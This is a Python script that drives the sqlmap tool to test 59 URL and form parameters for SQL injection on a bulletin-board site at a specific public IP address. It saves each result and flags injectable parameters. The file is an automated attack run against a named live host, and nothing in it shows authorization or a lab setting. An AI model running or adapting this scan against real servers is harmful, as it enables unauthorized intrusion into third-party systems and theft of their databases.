import subprocess, os
os.chdir(r"c:/Users/gudrh/Desktop/sqlmapproject-sqlmap-e659543")
os.makedirs("scan_results", exist_ok=True)
print("[1/59] form_0001", flush=True)
r = subprocess.run('python sqlmap.py -u "http://34.68.27.120:8081/bbs/search.php?sfl=wr_subject%7C%7Cwr_content&sop=and&stx=test" -p sfl,sop,stx --batch --risk=1 --level=2 --flush-session', shell=True, capture_output=True, text=True, encoding="utf-8", errors="replace")
open("scan_results/form_0001.txt", "w", encoding="utf-8").write(r.stdout + r.stderr)
vuln = "Parameter" in r.stdout and "injectable" in r.stdout
print("  VULN" if vuln else "  safe", flush=True)
print("[2/59] form_0002", flush=True)
r = subprocess.run('python sqlmap.py -u "http://34.68.27.120:8081/bbs/faq.php?fm_id=1&stx=test" -p fm_id,stx --batch --risk=1 --level=2 --flush-session', shell=True, capture_output=True, text=True, encoding="utf-8", errors="replace")
open("scan_results/form_0002.txt", "w", encoding="utf-8").write(r.stdout + r.stderr)
vuln = "Parameter" in r.stdout and "injectable" in r.stdout
print("  VULN" if vuln else "  safe", flush=True)
print("[3/59] form_0004", flush=True)
r = subprocess.run('python sqlmap.py -u "http://34.68.27.120:8081/bbs/qalist.php?sca=test&stx=test" -p sca,stx --batch --risk=1 --level=2 --flush-session', shell=True, capture_output=True, text=True, encoding="utf-8", errors="replace")
open("scan_results/form_0004.txt", "w", encoding="utf-8").write(r.stdout + r.stderr)
vuln = "Parameter" in r.stdout and "injectable" in r.stdout
print("  VULN" if vuln else "  safe", flush=True)
print("[4/59] form_0005", flush=True)
r = subprocess.run('python sqlmap.py -u "http://34.68.27.120:8081/bbs/search.php?srows=0&gr_id=test&sfl=test&stx=test&sop=or" -p gr_id,sfl,sop,srows,stx --batch --risk=1 --level=2 --flush-session', shell=True, capture_output=True, text=True, encoding="utf-8", errors="replace")
open("scan_results/form_0005.txt", "w", encoding="utf-8").write(r.stdout + r.stderr)
vuln = "Parameter" in r.stdout and "injectable" in r.stdout
print("  VULN" if vuln else "  safe", flush=True)
print("[5/59] url_0006", flush=True)
r = subprocess.run('python sqlmap.py -u "http://34.68.27.120:8081/bbs/member_confirm.php?url=http%3A%2F%2F34.68.27.120%3A8081%2Fbbs%2Fregister_form.php" -p url --batch --risk=1 --level=2 --flush-session', shell=True, capture_output=True, text=True, encoding="utf-8", errors="replace")
open("scan_results/url_0006.txt", "w", encoding="utf-8").write(r.stdout + r.stderr)
vuln = "Parameter" in r.stdout and "injectable" in r.stdout
print("  VULN" if vuln else "  safe", flush=True)
print("[6/59] form_0007", flush=True)
r = subprocess.run('python sqlmap.py -u "http://34.68.27.120:8081/bbs/register_form.php" --data "mb_id=user1&w=u&mb_password=test" -p mb_id,mb_password,w --batch --risk=1 --level=2 --flush-session', shell=True, capture_output=True, text=True, encoding="utf-8", errors="replace")
open("scan_results/form_0007.txt", "w", encoding="utf-8").write(r.stdout + r.stderr)
vuln = "Parameter" in r.stdout and "injectable" in r.stdout
print("  VULN" if vuln else "  safe", flush=True)
print("[7/59] form_0015", flush=True)
r = subprocess.run('python sqlmap.py -u "http://34.68.27.120:8081/bbs/new.php?gr_id=test&view=test&mb_id=test" -p gr_id,mb_id,view --batch --risk=1 --level=2 --flush-session', shell=True, capture_output=True, text=True, encoding="utf-8", errors="replace")
open("scan_results/form_0015.txt", "w", encoding="utf-8").write(r.stdout + r.stderr)
vuln = "Parameter" in r.stdout and "injectable" in r.stdout
print("  VULN" if vuln else "  safe", flush=True)
print("[8/59] form_0016", flush=True)
r = subprocess.run('python sqlmap.py -u "http://34.68.27.120:8081/bbs/new.php" --data "sw=move&view=test&sfl=test&stx=test&bo_table=test&page=1&pressed=test" -p bo_table,page,pressed,sfl,stx,sw,view --batch --risk=1 --level=2 --flush-session', shell=True, capture_output=True, text=True, encoding="utf-8", errors="replace")
open("scan_results/form_0016.txt", "w", encoding="utf-8").write(r.stdout + r.stderr)
vuln = "Parameter" in r.stdout and "injectable" in r.stdout
print("  VULN" if vuln else "  safe", flush=True)
print("[9/59] url_0017", flush=True)
r = subprocess.run('python sqlmap.py -u "http://34.68.27.120:8081/bbs/faq.php?fm_id=1" -p fm_id --batch --risk=1 --level=2 --flush-session', shell=True, capture_output=True, text=True, encoding="utf-8", errors="replace")
open("scan_results/url_0017.txt", "w", encoding="utf-8").write(r.stdout + r.stderr)
vuln = "Parameter" in r.stdout and "injectable" in r.stdout
print("  VULN" if vuln else "  safe", flush=True)
print("[10/59] url_0019", flush=True)
r = subprocess.run('python sqlmap.py -u "http://34.68.27.120:8081/bbs/board.php?bo_table=notice" -p bo_table --batch --risk=1 --level=2 --flush-session', shell=True, capture_output=True, text=True, encoding="utf-8", errors="replace")
open("scan_results/url_0019.txt", "w", encoding="utf-8").write(r.stdout + r.stderr)
vuln = "Parameter" in r.stdout and "injectable" in r.stdout
print("  VULN" if vuln else "  safe", flush=True)
print("[11/59] form_0021", flush=True)
r = subprocess.run('python sqlmap.py -u "http://34.68.27.120:8081/bbs/board.php?bo_table=notice&sca=test&sop=and&sfl=test&stx=test" -p bo_table,sca,sfl,sop,stx --batch --risk=1 --level=2 --flush-session', shell=True, capture_output=True, text=True, encoding="utf-8", errors="replace")
open("scan_results/form_0021.txt", "w", encoding="utf-8").write(r.stdout + r.stderr)
vuln = "Parameter" in r.stdout and "injectable" in r.stdout
print("  VULN" if vuln else "  safe", flush=True)
print("[12/59] url_0022", flush=True)
r = subprocess.run('python sqlmap.py -u "http://34.68.27.120:8081/bbs/content.php?co_id=company" -p co_id --batch --risk=1 --level=2 --flush-session', shell=True, capture_output=True, text=True, encoding="utf-8", errors="replace")
open("scan_results/url_0022.txt", "w", encoding="utf-8").write(r.stdout + r.stderr)
vuln = "Parameter" in r.stdout and "injectable" in r.stdout
print("  VULN" if vuln else "  safe", flush=True)
print("[13/59] url_0023", flush=True)
r = subprocess.run('python sqlmap.py -u "http://34.68.27.120:8081/bbs/faq.php?device=mobile" -p device --batch --risk=1 --level=2 --flush-session', shell=True, capture_output=True, text=True, encoding="utf-8", errors="replace")
open("scan_results/url_0023.txt", "w", encoding="utf-8").write(r.stdout + r.stderr)
vuln = "Parameter" in r.stdout and "injectable" in r.stdout
print("  VULN" if vuln else "  safe", flush=True)
print("[14/59] url_0028", flush=True)
r = subprocess.run('python sqlmap.py -u "http://34.68.27.120:8081/bbs/board.php?bo_table=free&wr_id=1" -p bo_table,wr_id --batch --risk=1 --level=2 --flush-session', shell=True, capture_output=True, text=True, encoding="utf-8", errors="replace")
open("scan_results/url_0028.txt", "w", encoding="utf-8").write(r.stdout + r.stderr)
vuln = "Parameter" in r.stdout and "injectable" in r.stdout
print("  VULN" if vuln else "  safe", flush=True)
print("[15/59] url_0032", flush=True)
r = subprocess.run('python sqlmap.py -u "http://34.68.27.120:8081/index.php?device=mobile" -p device --batch --risk=1 --level=2 --flush-session', shell=True, capture_output=True, text=True, encoding="utf-8", errors="replace")
open("scan_results/url_0032.txt", "w", encoding="utf-8").write(r.stdout + r.stderr)
vuln = "Parameter" in r.stdout and "injectable" in r.stdout
print("  VULN" if vuln else "  safe", flush=True)
print("[16/59] url_0034", flush=True)
r = subprocess.run('python sqlmap.py -u "http://34.68.27.120:8081/bbs/qalist.php?sca=%ED%9A%8C%EC%9B%90" -p sca --batch --risk=1 --level=2 --flush-session', shell=True, capture_output=True, text=True, encoding="utf-8", errors="replace")
open("scan_results/url_0034.txt", "w", encoding="utf-8").write(r.stdout + r.stderr)
vuln = "Parameter" in r.stdout and "injectable" in r.stdout
print("  VULN" if vuln else "  safe", flush=True)
print("[17/59] url_0037", flush=True)
r = subprocess.run('python sqlmap.py -u "http://34.68.27.120:8081/bbs/qalist.php?device=mobile" -p device --batch --risk=1 --level=2 --flush-session', shell=True, capture_output=True, text=True, encoding="utf-8", errors="replace")
open("scan_results/url_0037.txt", "w", encoding="utf-8").write(r.stdout + r.stderr)
vuln = "Parameter" in r.stdout and "injectable" in r.stdout
print("  VULN" if vuln else "  safe", flush=True)
print("[18/59] url_0039", flush=True)
r = subprocess.run('python sqlmap.py -u "http://34.68.27.120:8081/bbs/memo.php?kind=recv" -p kind --batch --risk=1 --level=2 --flush-session', shell=True, capture_output=True, text=True, encoding="utf-8", errors="replace")
open("scan_results/url_0039.txt", "w", encoding="utf-8").write(r.stdout + r.stderr)
vuln = "Parameter" in r.stdout and "injectable" in r.stdout
print("  VULN" if vuln else "  safe", flush=True)
print("[19/59] url_0041", flush=True)
r = subprocess.run('python sqlmap.py -u "http://34.68.27.120:8081/bbs/search.php?device=mobile" -p device --batch --risk=1 --level=2 --flush-session', shell=True, capture_output=True, text=True, encoding="utf-8", errors="replace")
open("scan_results/url_0041.txt", "w", encoding="utf-8").write(r.stdout + r.stderr)
vuln = "Parameter" in r.stdout and "injectable" in r.stdout
print("  VULN" if vuln else "  safe", flush=True)
print("[20/59] url_0043", flush=True)
r = subprocess.run('python sqlmap.py -u "http://34.68.27.120:8081/bbs/search.php?sfl=wr_subject&sop=and&stx=%22&device=mobile" -p device,sfl,sop,stx --batch --risk=1 --level=2 --flush-session', shell=True, capture_output=True, text=True, encoding="utf-8", errors="replace")
open("scan_results/url_0043.txt", "w", encoding="utf-8").write(r.stdout + r.stderr)
vuln = "Parameter" in r.stdout and "injectable" in r.stdout
print("  VULN" if vuln else "  safe", flush=True)
print("[21/59] url_0051", flush=True)
r = subprocess.run('python sqlmap.py -u "http://34.68.27.120:8081/bbs/profile.php?mb_id=user1" -p mb_id --batch --risk=1 --level=2 --flush-session', shell=True, capture_output=True, text=True, encoding="utf-8", errors="replace")
open("scan_results/url_0051.txt", "w", encoding="utf-8").write(r.stdout + r.stderr)
vuln = "Parameter" in r.stdout and "injectable" in r.stdout
print("  VULN" if vuln else "  safe", flush=True)
print("[22/59] url_0052", flush=True)
r = subprocess.run('python sqlmap.py -u "http://34.68.27.120:8081/bbs/memo_form.php?me_recv_mb_id=user1" -p me_recv_mb_id --batch --risk=1 --level=2 --flush-session', shell=True, capture_output=True, text=True, encoding="utf-8", errors="replace")
open("scan_results/url_0052.txt", "w", encoding="utf-8").write(r.stdout + r.stderr)
vuln = "Parameter" in r.stdout and "injectable" in r.stdout
print("  VULN" if vuln else "  safe", flush=True)
print("[23/59] url_0053", flush=True)
r = subprocess.run('python sqlmap.py -u "http://34.68.27.120:8081/bbs/formmail.php?mb_id=user1&name=user1&email=2qqeqJV4qJ6qqGOaoNA-" -p email,mb_id,name --batch --risk=1 --level=2 --flush-session', shell=True, capture_output=True, text=True, encoding="utf-8", errors="replace")
open("scan_results/url_0053.txt", "w", encoding="utf-8").write(r.stdout + r.stderr)
vuln = "Parameter" in r.stdout and "injectable" in r.stdout
print("  VULN" if vuln else "  safe", flush=True)
print("[24/59] url_0055", flush=True)
r = subprocess.run('python sqlmap.py -u "http://34.68.27.120:8081/bbs/new.php?mb_id=user1" -p mb_id --batch --risk=1 --level=2 --flush-session', shell=True, capture_output=True, text=True, encoding="utf-8", errors="replace")
open("scan_results/url_0055.txt", "w", encoding="utf-8").write(r.stdout + r.stderr)
vuln = "Parameter" in r.stdout and "injectable" in r.stdout
print("  VULN" if vuln else "  safe", flush=True)
print("[25/59] url_0057", flush=True)
r = subprocess.run('python sqlmap.py -u "http://34.68.27.120:8081/bbs/current_connect.php?device=mobile" -p device --batch --risk=1 --level=2 --flush-session', shell=True, capture_output=True, text=True, encoding="utf-8", errors="replace")
open("scan_results/url_0057.txt", "w", encoding="utf-8").write(r.stdout + r.stderr)
vuln = "Parameter" in r.stdout and "injectable" in r.stdout
print("  VULN" if vuln else "  safe", flush=True)
print("[26/59] url_0058", flush=True)
r = subprocess.run('python sqlmap.py -u "http://34.68.27.120:8081/bbs/new.php?gr_id=community" -p gr_id --batch --risk=1 --level=2 --flush-session', shell=True, capture_output=True, text=True, encoding="utf-8", errors="replace")
open("scan_results/url_0058.txt", "w", encoding="utf-8").write(r.stdout + r.stderr)
vuln = "Parameter" in r.stdout and "injectable" in r.stdout
print("  VULN" if vuln else "  safe", flush=True)
print("[27/59] url_0060", flush=True)
r = subprocess.run('python sqlmap.py -u "http://34.68.27.120:8081/bbs/new.php?device=mobile" -p device --batch --risk=1 --level=2 --flush-session', shell=True, capture_output=True, text=True, encoding="utf-8", errors="replace")
open("scan_results/url_0060.txt", "w", encoding="utf-8").write(r.stdout + r.stderr)
vuln = "Parameter" in r.stdout and "injectable" in r.stdout
print("  VULN" if vuln else "  safe", flush=True)
print("[28/59] url_0062", flush=True)
r = subprocess.run('python sqlmap.py -u "http://34.68.27.120:8081/bbs/faq.php?fm_id=1&device=mobile" -p device,fm_id --batch --risk=1 --level=2 --flush-session', shell=True, capture_output=True, text=True, encoding="utf-8", errors="replace")
open("scan_results/url_0062.txt", "w", encoding="utf-8").write(r.stdout + r.stderr)
vuln = "Parameter" in r.stdout and "injectable" in r.stdout
print("  VULN" if vuln else "  safe", flush=True)
print("[29/59] url_0064", flush=True)
r = subprocess.run('python sqlmap.py -u "http://34.68.27.120:8081/bbs/write.php?bo_table=notice" -p bo_table --batch --risk=1 --level=2 --flush-session', shell=True, capture_output=True, text=True, encoding="utf-8", errors="replace")
open("scan_results/url_0064.txt", "w", encoding="utf-8").write(r.stdout + r.stderr)
vuln = "Parameter" in r.stdout and "injectable" in r.stdout
print("  VULN" if vuln else "  safe", flush=True)
print("[30/59] url_0066", flush=True)
r = subprocess.run('python sqlmap.py -u "http://34.68.27.120:8081/bbs/board.php?bo_table=notice&sop=and&sst=wr_hit&sod=desc&sfl=test&stx=test&sca=test&page=1" -p bo_table,page,sca,sfl,sod,sop,sst,stx --batch --risk=1 --level=2 --flush-session', shell=True, capture_output=True, text=True, encoding="utf-8", errors="replace")
open("scan_results/url_0066.txt", "w", encoding="utf-8").write(r.stdout + r.stderr)
vuln = "Parameter" in r.stdout and "injectable" in r.stdout
print("  VULN" if vuln else "  safe", flush=True)
print("[31/59] url_0069", flush=True)
r = subprocess.run('python sqlmap.py -u "http://34.68.27.120:8081/bbs/board.php?bo_table=notice&device=mobile" -p bo_table,device --batch --risk=1 --level=2 --flush-session', shell=True, capture_output=True, text=True, encoding="utf-8", errors="replace")
open("scan_results/url_0069.txt", "w", encoding="utf-8").write(r.stdout + r.stderr)
vuln = "Parameter" in r.stdout and "injectable" in r.stdout
print("  VULN" if vuln else "  safe", flush=True)
print("[32/59] url_0071", flush=True)
r = subprocess.run('python sqlmap.py -u "http://34.68.27.120:8081/bbs/point.php?page=2" -p page --batch --risk=1 --level=2 --flush-session', shell=True, capture_output=True, text=True, encoding="utf-8", errors="replace")
open("scan_results/url_0071.txt", "w", encoding="utf-8").write(r.stdout + r.stderr)
vuln = "Parameter" in r.stdout and "injectable" in r.stdout
print("  VULN" if vuln else "  safe", flush=True)
print("[33/59] url_0072", flush=True)
r = subprocess.run('python sqlmap.py -u "http://34.68.27.120:8081/bbs/content.php?co_id=company&device=mobile" -p co_id,device --batch --risk=1 --level=2 --flush-session', shell=True, capture_output=True, text=True, encoding="utf-8", errors="replace")
open("scan_results/url_0072.txt", "w", encoding="utf-8").write(r.stdout + r.stderr)
vuln = "Parameter" in r.stdout and "injectable" in r.stdout
print("  VULN" if vuln else "  safe", flush=True)
print("[34/59] url_0077", flush=True)
r = subprocess.run('python sqlmap.py -u "http://34.68.27.120:8081/bbs/write.php?w=r&bo_table=free&wr_id=1" -p bo_table,w,wr_id --batch --risk=1 --level=2 --flush-session', shell=True, capture_output=True, text=True, encoding="utf-8", errors="replace")
open("scan_results/url_0077.txt", "w", encoding="utf-8").write(r.stdout + r.stderr)
vuln = "Parameter" in r.stdout and "injectable" in r.stdout
print("  VULN" if vuln else "  safe", flush=True)
print("[35/59] url_0078", flush=True)
r = subprocess.run('python sqlmap.py -u "http://34.68.27.120:8081/bbs/write.php?w=u&bo_table=free&wr_id=1&page=test" -p bo_table,page,w,wr_id --batch --risk=1 --level=2 --flush-session', shell=True, capture_output=True, text=True, encoding="utf-8", errors="replace")
open("scan_results/url_0078.txt", "w", encoding="utf-8").write(r.stdout + r.stderr)
vuln = "Parameter" in r.stdout and "injectable" in r.stdout
print("  VULN" if vuln else "  safe", flush=True)
print("[36/59] url_0081", flush=True)
r = subprocess.run('python sqlmap.py -u "http://34.68.27.120:8081/bbs/scrap_popin.php?bo_table=free&wr_id=1" -p bo_table,wr_id --batch --risk=1 --level=2 --flush-session', shell=True, capture_output=True, text=True, encoding="utf-8", errors="replace")
open("scan_results/url_0081.txt", "w", encoding="utf-8").write(r.stdout + r.stderr)
vuln = "Parameter" in r.stdout and "injectable" in r.stdout
print("  VULN" if vuln else "  safe", flush=True)
print("[37/59] url_0083", flush=True)
r = subprocess.run('python sqlmap.py -u "http://34.68.27.120:8081/bbs/board.php?bo_table=free&wr_id=1&device=pc" -p bo_table,device,wr_id --batch --risk=1 --level=2 --flush-session', shell=True, capture_output=True, text=True, encoding="utf-8", errors="replace")
open("scan_results/url_0083.txt", "w", encoding="utf-8").write(r.stdout + r.stderr)
vuln = "Parameter" in r.stdout and "injectable" in r.stdout
print("  VULN" if vuln else "  safe", flush=True)
print("[38/59] url_0085", flush=True)
r = subprocess.run('python sqlmap.py -u "http://34.68.27.120:8081/bbs/password.php?w=u&bo_table=test&wr_id=3&page=test" -p bo_table,page,w,wr_id --batch --risk=1 --level=2 --flush-session', shell=True, capture_output=True, text=True, encoding="utf-8", errors="replace")
open("scan_results/url_0085.txt", "w", encoding="utf-8").write(r.stdout + r.stderr)
vuln = "Parameter" in r.stdout and "injectable" in r.stdout
print("  VULN" if vuln else "  safe", flush=True)
print("[39/59] form_0086", flush=True)
r = subprocess.run('python sqlmap.py -u "http://34.68.27.120:8081/bbs/write.php" --data "w=u&bo_table=test&wr_id=3&comment_id=test&sfl=test&stx=test&page=0&wr_password=test" -p bo_table,comment_id,page,sfl,stx,w,wr_id,wr_password --batch --risk=1 --level=2 --flush-session', shell=True, capture_output=True, text=True, encoding="utf-8", errors="replace")
open("scan_results/form_0086.txt", "w", encoding="utf-8").write(r.stdout + r.stderr)
vuln = "Parameter" in r.stdout and "injectable" in r.stdout
print("  VULN" if vuln else "  safe", flush=True)
print("[40/59] url_0088", flush=True)
r = subprocess.run('python sqlmap.py -u "http://34.68.27.120:8081/bbs/board.php?bo_table=test&page=test" -p bo_table,page --batch --risk=1 --level=2 --flush-session', shell=True, capture_output=True, text=True, encoding="utf-8", errors="replace")
open("scan_results/url_0088.txt", "w", encoding="utf-8").write(r.stdout + r.stderr)
vuln = "Parameter" in r.stdout and "injectable" in r.stdout
print("  VULN" if vuln else "  safe", flush=True)
print("[41/59] url_0095", flush=True)
r = subprocess.run('python sqlmap.py -u "http://34.68.27.120:8081/bbs/download.php?bo_table=gallery&wr_id=1&no=0" -p bo_table,no,wr_id --batch --risk=1 --level=2 --flush-session', shell=True, capture_output=True, text=True, encoding="utf-8", errors="replace")
open("scan_results/url_0095.txt", "w", encoding="utf-8").write(r.stdout + r.stderr)
vuln = "Parameter" in r.stdout and "injectable" in r.stdout
print("  VULN" if vuln else "  safe", flush=True)
print("[42/59] url_0096", flush=True)
r = subprocess.run('python sqlmap.py -u "http://34.68.27.120:8081/bbs/link.php?bo_table=gallery&wr_id=1&no=2" -p bo_table,no,wr_id --batch --risk=1 --level=2 --flush-session', shell=True, capture_output=True, text=True, encoding="utf-8", errors="replace")
open("scan_results/url_0096.txt", "w", encoding="utf-8").write(r.stdout + r.stderr)
vuln = "Parameter" in r.stdout and "injectable" in r.stdout
print("  VULN" if vuln else "  safe", flush=True)
print("[43/59] url_0097", flush=True)
r = subprocess.run('python sqlmap.py -u "http://34.68.27.120:8081/bbs/board.php?bo_table=gallery&wr_id=1&c_id=2&w=c" -p bo_table,c_id,w,wr_id --batch --risk=1 --level=2 --flush-session', shell=True, capture_output=True, text=True, encoding="utf-8", errors="replace")
open("scan_results/url_0097.txt", "w", encoding="utf-8").write(r.stdout + r.stderr)
vuln = "Parameter" in r.stdout and "injectable" in r.stdout
print("  VULN" if vuln else "  safe", flush=True)
print("[44/59] url_0098", flush=True)
r = subprocess.run('python sqlmap.py -u "http://34.68.27.120:8081/bbs/qawrite.php?device=pc" -p device --batch --risk=1 --level=2 --flush-session', shell=True, capture_output=True, text=True, encoding="utf-8", errors="replace")
open("scan_results/url_0098.txt", "w", encoding="utf-8").write(r.stdout + r.stderr)
vuln = "Parameter" in r.stdout and "injectable" in r.stdout
print("  VULN" if vuln else "  safe", flush=True)
print("[45/59] url_0099", flush=True)
r = subprocess.run('python sqlmap.py -u "http://34.68.27.120:8081/bbs/qalist.php?sca=%ED%9A%8C%EC%9B%90&device=pc" -p device,sca --batch --risk=1 --level=2 --flush-session', shell=True, capture_output=True, text=True, encoding="utf-8", errors="replace")
open("scan_results/url_0099.txt", "w", encoding="utf-8").write(r.stdout + r.stderr)
vuln = "Parameter" in r.stdout and "injectable" in r.stdout
print("  VULN" if vuln else "  safe", flush=True)
print("[46/59] url_0111", flush=True)
r = subprocess.run('python sqlmap.py -u "http://34.68.27.120:8081/bbs/new.php?mb_id=user1&device=pc" -p device,mb_id --batch --risk=1 --level=2 --flush-session', shell=True, capture_output=True, text=True, encoding="utf-8", errors="replace")
open("scan_results/url_0111.txt", "w", encoding="utf-8").write(r.stdout + r.stderr)
vuln = "Parameter" in r.stdout and "injectable" in r.stdout
print("  VULN" if vuln else "  safe", flush=True)
print("[47/59] url_0114", flush=True)
r = subprocess.run('python sqlmap.py -u "http://34.68.27.120:8081/bbs/new.php?gr_id=community&device=pc" -p device,gr_id --batch --risk=1 --level=2 --flush-session', shell=True, capture_output=True, text=True, encoding="utf-8", errors="replace")
open("scan_results/url_0114.txt", "w", encoding="utf-8").write(r.stdout + r.stderr)
vuln = "Parameter" in r.stdout and "injectable" in r.stdout
print("  VULN" if vuln else "  safe", flush=True)
print("[48/59] url_0120", flush=True)
r = subprocess.run('python sqlmap.py -u "http://34.68.27.120:8081/bbs/write.php?bo_table=notice&device=pc" -p bo_table,device --batch --risk=1 --level=2 --flush-session', shell=True, capture_output=True, text=True, encoding="utf-8", errors="replace")
open("scan_results/url_0120.txt", "w", encoding="utf-8").write(r.stdout + r.stderr)
vuln = "Parameter" in r.stdout and "injectable" in r.stdout
print("  VULN" if vuln else "  safe", flush=True)
print("[49/59] url_0121", flush=True)
r = subprocess.run('python sqlmap.py -u "http://34.68.27.120:8081/bbs/board.php?bo_table=notice&sop=and&sst=wr_hit&sod=desc&page=1&device=pc" -p bo_table,device,page,sod,sop,sst --batch --risk=1 --level=2 --flush-session', shell=True, capture_output=True, text=True, encoding="utf-8", errors="replace")
open("scan_results/url_0121.txt", "w", encoding="utf-8").write(r.stdout + r.stderr)
vuln = "Parameter" in r.stdout and "injectable" in r.stdout
print("  VULN" if vuln else "  safe", flush=True)
print("[50/59] url_0131", flush=True)
r = subprocess.run('python sqlmap.py -u "http://34.68.27.120:8081/bbs/write.php?w=r&bo_table=free&wr_id=1&device=mobile" -p bo_table,device,w,wr_id --batch --risk=1 --level=2 --flush-session', shell=True, capture_output=True, text=True, encoding="utf-8", errors="replace")
open("scan_results/url_0131.txt", "w", encoding="utf-8").write(r.stdout + r.stderr)
vuln = "Parameter" in r.stdout and "injectable" in r.stdout
print("  VULN" if vuln else "  safe", flush=True)
print("[51/59] url_0138", flush=True)
r = subprocess.run('python sqlmap.py -u "http://34.68.27.120:8081/bbs/board.php?bo_table=gallery&wr_id=1&c_id=2&w=c&device=mobile" -p bo_table,c_id,device,w,wr_id --batch --risk=1 --level=2 --flush-session', shell=True, capture_output=True, text=True, encoding="utf-8", errors="replace")
open("scan_results/url_0138.txt", "w", encoding="utf-8").write(r.stdout + r.stderr)
vuln = "Parameter" in r.stdout and "injectable" in r.stdout
print("  VULN" if vuln else "  safe", flush=True)
print("[52/59] url_0149", flush=True)
r = subprocess.run('python sqlmap.py -u "http://34.68.27.120:8081/bbs/board.php?bo_table=free&wr_id=1&sst=wr_hit&sod=desc&sop=and&page=1" -p bo_table,page,sod,sop,sst,wr_id --batch --risk=1 --level=2 --flush-session', shell=True, capture_output=True, text=True, encoding="utf-8", errors="replace")
open("scan_results/url_0149.txt", "w", encoding="utf-8").write(r.stdout + r.stderr)
vuln = "Parameter" in r.stdout and "injectable" in r.stdout
print("  VULN" if vuln else "  safe", flush=True)
print("[53/59] url_0160", flush=True)
r = subprocess.run('python sqlmap.py -u "http://34.68.27.120:8081/bbs/write.php?w=u&bo_table=free&wr_id=1&page=1&sst=wr_hit&sod=desc&sop=and" -p bo_table,page,sod,sop,sst,w,wr_id --batch --risk=1 --level=2 --flush-session', shell=True, capture_output=True, text=True, encoding="utf-8", errors="replace")
open("scan_results/url_0160.txt", "w", encoding="utf-8").write(r.stdout + r.stderr)
vuln = "Parameter" in r.stdout and "injectable" in r.stdout
print("  VULN" if vuln else "  safe", flush=True)
print("[54/59] url_0163", flush=True)
r = subprocess.run('python sqlmap.py -u "http://34.68.27.120:8081/bbs/board.php?bo_table=free&wr_id=1&sst=wr_hit&sod=desc&sop=and&page=1&device=mobile" -p bo_table,device,page,sod,sop,sst,wr_id --batch --risk=1 --level=2 --flush-session', shell=True, capture_output=True, text=True, encoding="utf-8", errors="replace")
open("scan_results/url_0163.txt", "w", encoding="utf-8").write(r.stdout + r.stderr)
vuln = "Parameter" in r.stdout and "injectable" in r.stdout
print("  VULN" if vuln else "  safe", flush=True)
print("[55/59] url_0169", flush=True)
r = subprocess.run('python sqlmap.py -u "http://34.68.27.120:8081/bbs/password.php?w=u&bo_table=test&wr_id=3&page=1&sst=wr_hit&sod=desc&sop=and" -p bo_table,page,sod,sop,sst,w,wr_id --batch --risk=1 --level=2 --flush-session', shell=True, capture_output=True, text=True, encoding="utf-8", errors="replace")
open("scan_results/url_0169.txt", "w", encoding="utf-8").write(r.stdout + r.stderr)
vuln = "Parameter" in r.stdout and "injectable" in r.stdout
print("  VULN" if vuln else "  safe", flush=True)
print("[56/59] url_0180", flush=True)
r = subprocess.run('python sqlmap.py -u "http://34.68.27.120:8081/bbs/write.php?w=u&bo_table=free&wr_id=1&page=1&sst=wr_hit&sod=desc&sop=and&device=pc" -p bo_table,device,page,sod,sop,sst,w,wr_id --batch --risk=1 --level=2 --flush-session', shell=True, capture_output=True, text=True, encoding="utf-8", errors="replace")
open("scan_results/url_0180.txt", "w", encoding="utf-8").write(r.stdout + r.stderr)
vuln = "Parameter" in r.stdout and "injectable" in r.stdout
print("  VULN" if vuln else "  safe", flush=True)
print("[57/59] url_0181", flush=True)
r = subprocess.run('python sqlmap.py -u "http://34.68.27.120:8081/bbs/board.php?bo_table=free&wr_id=1&page=1" -p bo_table,page,wr_id --batch --risk=1 --level=2 --flush-session', shell=True, capture_output=True, text=True, encoding="utf-8", errors="replace")
open("scan_results/url_0181.txt", "w", encoding="utf-8").write(r.stdout + r.stderr)
vuln = "Parameter" in r.stdout and "injectable" in r.stdout
print("  VULN" if vuln else "  safe", flush=True)
print("[58/59] url_0182", flush=True)
r = subprocess.run('python sqlmap.py -u "http://34.68.27.120:8081/bbs/board.php?bo_table=free&page=1&device=pc" -p bo_table,device,page --batch --risk=1 --level=2 --flush-session', shell=True, capture_output=True, text=True, encoding="utf-8", errors="replace")
open("scan_results/url_0182.txt", "w", encoding="utf-8").write(r.stdout + r.stderr)
vuln = "Parameter" in r.stdout and "injectable" in r.stdout
print("  VULN" if vuln else "  safe", flush=True)
print("[59/59] url_0191", flush=True)
r = subprocess.run('python sqlmap.py -u "http://34.68.27.120:8081/bbs/board.php?bo_table=free&wr_id=1&page=1&device=mobile" -p bo_table,device,page,wr_id --batch --risk=1 --level=2 --flush-session', shell=True, capture_output=True, text=True, encoding="utf-8", errors="replace")
open("scan_results/url_0191.txt", "w", encoding="utf-8").write(r.stdout + r.stderr)
vuln = "Parameter" in r.stdout and "injectable" in r.stdout
print("  VULN" if vuln else "  safe", flush=True)